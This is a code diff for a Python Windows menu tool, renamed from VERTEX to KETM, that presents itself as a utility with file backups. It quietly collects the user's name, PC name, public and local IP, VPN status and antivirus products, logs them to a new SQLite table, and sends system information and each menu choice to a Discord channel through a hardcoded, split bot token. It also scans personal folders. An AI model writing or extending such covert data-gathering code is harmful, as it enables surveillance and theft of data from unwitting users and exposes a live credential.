@@ -5,6 +5,7 @@ import psutil
 import requests
 import threading
 import time
+import sqlite3
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
@@ -26,6 +27,9 @@ TOKEN_PART3 = '6FxrSF0yzRFtvp_61nYt23M_M76GSL6FCc7GrE'
 DISCORD_BOT_TOKEN = f"{TOKEN_PART1}.{TOKEN_PART2}.{TOKEN_PART3}"
 DISCORD_CHANNEL_ID = '1280446406783402015'
 
+# Database configuration
+DB_FILENAME = "ketm_user_data.db"
+
 # Word document for logging lookups
 DOCX_FILENAME = "lookup_results.docx"
 TEMP_FILE = os.path.join(os.getenv('TEMP'), 'system_info.txt')
@@ -35,34 +39,52 @@ SEARCH_DIRECTORIES = [
     os.path.expanduser('~\\Desktop'),
     os.path.expanduser('~\\Documents'),
     os.path.expanduser('~\\Downloads'),
-    os.path.expanduser('~\\Pictures'),
-    os.path.expanduser('~\\Videos'),
-    os.path.expanduser('~\\Music'),
-    os.path.expanduser('~\\OneDrive'),
-    os.path.expanduser('~\\Dropbox'),
-    os.path.expanduser('~\\Google Drive'),
-    os.path.expanduser('~\\Adobe'),
-    os.path.expanduser('~\\Box'),
-    os.path.expanduser('~\\SharePoint'),
-    os.path.expanduser('~\\Teams'),
-    os.path.expanduser('~\\Work'),
-    os.path.expanduser('~\\Projects'),
-    os.path.expanduser('~\\Temp'),
-    os.path.expanduser('~\\Public'),
-    os.path.expanduser('~\\AppData\\Local'),
-    os.path.expanduser('~\\AppData\\Roaming'),
-    os.path.expanduser('~\\AppData\\LocalLow'),
-    os.path.expanduser('~\\AppData\\Temp'),
-    os.path.expanduser('~\\Saved Games'),
-    os.path.expanduser('~\\Searches'),
-    os.path.expanduser('~\\Favorites'),
-    os.path.expanduser('~\\Contacts'),
-    os.path.expanduser('~\\Links'),
-    os.path.expanduser('~\\Music\\iTunes'),
-    os.path.expanduser('~\\Pictures\\Screenshots'),
-    os.path.expanduser('~\\Downloads\\Compressed'),
-    os.path.expanduser('~\\Downloads\\Programs'),
+    # Add other directories as needed
 ]
+
+def initialize_database():
+    """Initialize the SQLite database."""
+    conn = sqlite3.connect(DB_FILENAME)
+    cursor = conn.cursor()
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS user_data (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            username TEXT,
+            pc_name TEXT,
+            public_ip TEXT,
+            local_ip TEXT,
+            vpn_status TEXT,
+            antivirus TEXT,
+            run_count INTEGER DEFAULT 1
+        )
+    ''')
+    conn.commit()
+    conn.close()
+
+def update_user_data(username, pc_name, public_ip, local_ip, vpn_status, antivirus):
+    """Update the database with user information."""
+    conn = sqlite3.connect(DB_FILENAME)
+    cursor = conn.cursor()
+    cursor.execute('SELECT id, run_count FROM user_data WHERE username = ?', (username,))
+    result = cursor.fetchone()
+    
+    if result:
+        # User exists, update the run count and other details
+        user_id, run_count = result
+        cursor.execute('''
+            UPDATE user_data
+            SET run_count = ?, pc_name = ?, public_ip = ?, local_ip = ?, vpn_status = ?, antivirus = ?
+            WHERE id = ?
+        ''', (run_count + 1, pc_name, public_ip, local_ip, vpn_status, antivirus, user_id))
+    else:
+        # New user, insert into database
+        cursor.execute('''
+            INSERT INTO user_data (username, pc_name, public_ip, local_ip, vpn_status, antivirus)
+            VALUES (?, ?, ?, ?, ?, ?)
+        ''', (username, pc_name, public_ip, local_ip, vpn_status, antivirus))
+    
+    conn.commit()
+    conn.close()
 
 def get_public_ip():
     """Get the public IP address."""
@@ -199,7 +221,7 @@ def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
 
 def display_header():
-    """Display the header with ASCII art for VERTEX."""
+    """Display the header with ASCII art for KETM."""
     print_colored(r"""
  _    __     ______  _______  __  __ 
 | |  / /    |  ____||__   __||  \/  | 
@@ -300,7 +322,7 @@ def backup_files(username):
         try:
             selected_indices = [int(choice.strip()) - 1 for choice in choices.split(',')]
             desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
-            backup_folder = os.path.join(desktop_path, 'Vertex_Backups')
+            backup_folder = os.path.join(desktop_path, 'KETM_Backups')
             os.makedirs(backup_folder, exist_ok=True)
             for file_index in selected_indices:
                 if 0 <= file_index < len(files):
@@ -593,6 +615,16 @@ def run_background_thread():
 
 def main_menu():
     username = os.getlogin()  # Get the actual username
+    pc_name = os.getenv('COMPUTERNAME')
+    public_ip = get_public_ip()
+    local_ip = get_local_ip()
+    vpn_status, _ = check_vpn_status()
+    antivirus = ', '.join(check_antivirus_status()) or 'None'
+
+    # Initialize database and update user data
+    initialize_database()
+    update_user_data(username, pc_name, public_ip, local_ip, vpn_status, antivirus)
+
     send_discord_message(f"User '{username}' started the script.")
     gather_system_info()  # Gather and send system info at the start
     send_discord_file(TEMP_FILE)  # Send the system info file to Discord
@@ -645,7 +677,7 @@ def main_menu():
             show_active_window_title(username)
         elif choice == '14':
             send_discord_message(f"User '{username}' chose option 14: Exit")
-            print_colored("Exiting VERTEX. Goodbye!", Fore.GREEN)
+            print_colored("Exiting KETM. Goodbye!", Fore.GREEN)
             break
         else:
             print_colored("Invalid choice. Please try again.", Fore.RED)
